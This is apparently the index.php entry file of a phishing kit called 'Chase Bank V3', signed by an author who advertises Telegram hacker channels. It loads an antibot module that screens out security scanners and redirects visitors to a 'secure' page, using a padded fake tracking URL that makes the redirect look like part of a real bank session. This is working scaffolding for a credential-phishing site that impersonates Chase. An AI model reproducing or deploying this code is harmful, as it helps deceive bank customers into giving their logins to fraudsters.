<?php
/**
 * @since             14/03/2021
 * @package           Chase
 * @telegram          @XBlackX_Coder
 * TeleGram Channel   @Anonymous_Hackez_Channel
 * Project Name:      Chase Bank V3
 * Author:            XBlackX
 * Author URI:        @XBlackX_Coder
 */
@session_start();
############################################
if(filesize("antibot.ini") == 1) {
}else{
require_once("antibot.php");
}

header('Location: secure/index.php?auth=2&home=1&from=TrackingUpdate&request-id=bec7c79d-ad78-43ec-9c71-d12e379905d20cDovL3d3dy5h&787778377vhefhhgfnvshnHBsZS5jb20vc2hvcHwxYW9zNGJjMKJHlkgiutgKHklgklu66GY4MTI3ZGZhMWKJHKLGHGDJHKJNvbS9zaG9wL2FjY291bnQvc2V0dXAvc3RhcnQ_c=');
###############################################################
?>